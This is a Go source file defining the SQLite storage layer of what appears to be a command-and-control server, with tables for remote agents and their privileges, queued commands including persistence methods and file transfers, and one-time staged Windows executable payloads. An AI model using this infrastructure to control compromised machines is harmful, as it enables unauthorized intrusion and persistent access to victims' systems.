package storage

import (
	"database/sql"
	"fmt"
	"os"
	"path/filepath"
	"time"

	_ "modernc.org/sqlite"
)

// Store wraps a SQLite database connection
type Store struct {
	db *sql.DB
}

// New opens (or creates) the SQLite database at dbPath and initialises the schema
func New(dbPath string) (*Store, error) {
	if dir := filepath.Dir(dbPath); dir != "." && dir != "" {
		if err := os.MkdirAll(dir, 0700); err != nil {
			return nil, fmt.Errorf("create db dir: %w", err)
		}
	}
	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return nil, fmt.Errorf("open db: %w", err)
	}
	db.SetMaxOpenConns(1)

	pragmas := []string{
		"PRAGMA journal_mode=WAL",
		"PRAGMA foreign_keys=ON",
		"PRAGMA busy_timeout=5000",
		"PRAGMA synchronous=NORMAL",
	}
	for _, p := range pragmas {
		if _, err := db.Exec(p); err != nil {
			db.Close()
			return nil, fmt.Errorf("pragma: %w", err)
		}
	}

	s := &Store{db: db}
	if err := s.initSchema(); err != nil {
		db.Close()
		return nil, fmt.Errorf("init schema: %w", err)
	}
	// Reset commands left in 'executing' state from a previous server session.
	// Without this, GetNext blocks new commands behind a stale executing command.
	s.resetStaleExecuting()
	return s, nil
}

// resetStaleExecuting marks any 'executing' commands as 'timeout' on startup.
// This prevents stale commands from a crashed session from blocking the queue.
func (s *Store) resetStaleExecuting() {
	now := time.Now().Unix()
	_, _ = s.db.Exec(`
		UPDATE commands SET
			status      = 'timeout',
			error       = 'server restarted — command was interrupted',
			completed_at = ?
		WHERE status = 'executing'`, now)
}

// Close closes the database connection
func (s *Store) Close() error {
	return s.db.Close()
}

func (s *Store) initSchema() error {
	_, err := s.db.Exec(`
	CREATE TABLE IF NOT EXISTS agents (
		id               TEXT PRIMARY KEY,
		hostname         TEXT NOT NULL,
		username         TEXT NOT NULL,
		os               TEXT NOT NULL,
		architecture     TEXT DEFAULT '',
		process_id       INTEGER DEFAULT 0,
		parent_process_id INTEGER DEFAULT 0,
		privileges       TEXT DEFAULT '',
		status           TEXT DEFAULT 'online',
		last_seen        INTEGER DEFAULT 0,
		last_heartbeat   INTEGER DEFAULT 0,
		first_contact    INTEGER DEFAULT 0,
		total_connections INTEGER DEFAULT 0,
		commands_executed INTEGER DEFAULT 0,
		files_transferred INTEGER DEFAULT 0,
		network_info     TEXT DEFAULT '{}',
		system_info      TEXT DEFAULT '{}',
		security_info    TEXT DEFAULT '{}',
		performance      TEXT DEFAULT '{}',
		metadata         TEXT DEFAULT '{}'
	);

	CREATE TABLE IF NOT EXISTS agent_errors (
		id           INTEGER PRIMARY KEY AUTOINCREMENT,
		agent_id     TEXT NOT NULL,
		error_type   TEXT DEFAULT '',
		message      TEXT DEFAULT '',
		command      TEXT DEFAULT '',
		severity     TEXT DEFAULT '',
		recoverable  INTEGER DEFAULT 1,
		occurred_at  INTEGER DEFAULT 0,
		FOREIGN KEY (agent_id) REFERENCES agents(id) ON DELETE CASCADE
	);

	CREATE TABLE IF NOT EXISTS commands (
		id               TEXT PRIMARY KEY,
		agent_id         TEXT NOT NULL,
		command          TEXT NOT NULL DEFAULT '',
		args             TEXT DEFAULT '[]',
		working_dir      TEXT DEFAULT '',
		timeout          INTEGER DEFAULT 0,
		status           TEXT DEFAULT 'pending',
		exit_code        INTEGER DEFAULT 0,
		output           TEXT DEFAULT '',
		error            TEXT DEFAULT '',
		metadata         TEXT DEFAULT '{}',
		operation_type   TEXT DEFAULT '',
		source_path      TEXT DEFAULT '',
		destination_path TEXT DEFAULT '',
		file_content     BLOB,
		is_encrypted     INTEGER DEFAULT 0,
		process_name     TEXT DEFAULT '',
		process_id       INTEGER DEFAULT 0,
		process_path     TEXT DEFAULT '',
		process_args     TEXT DEFAULT '[]',
		persist_method   TEXT DEFAULT '',
		persist_name     TEXT DEFAULT '',
		created_at       INTEGER DEFAULT 0,
		executed_at      INTEGER DEFAULT 0,
		completed_at     INTEGER DEFAULT 0,
		payload_json     TEXT DEFAULT '{}'
	);

	CREATE TABLE IF NOT EXISTS stages (
		token       TEXT PRIMARY KEY,
		payload     BLOB NOT NULL,
		format      TEXT DEFAULT 'exe',
		arch        TEXT DEFAULT 'amd64',
		os_target   TEXT DEFAULT 'windows',
		created_at  INTEGER DEFAULT 0,
		expires_at  INTEGER DEFAULT 0,
		used        INTEGER DEFAULT 0,
		used_at     INTEGER DEFAULT 0,
		used_by_ip  TEXT DEFAULT '',
		description TEXT DEFAULT ''
	);

	CREATE INDEX IF NOT EXISTS idx_commands_agent_status ON commands(agent_id, status);
	CREATE INDEX IF NOT EXISTS idx_commands_created      ON commands(created_at);
	CREATE INDEX IF NOT EXISTS idx_agent_errors_agent   ON agent_errors(agent_id, occurred_at);
	CREATE INDEX IF NOT EXISTS idx_stages_created        ON stages(created_at);
	`)
	if err != nil {
		return err
	}
	// Migrations for existing databases
	_, _ = s.db.Exec(`ALTER TABLE commands ADD COLUMN payload_json TEXT DEFAULT '{}'`)
	return nil
}
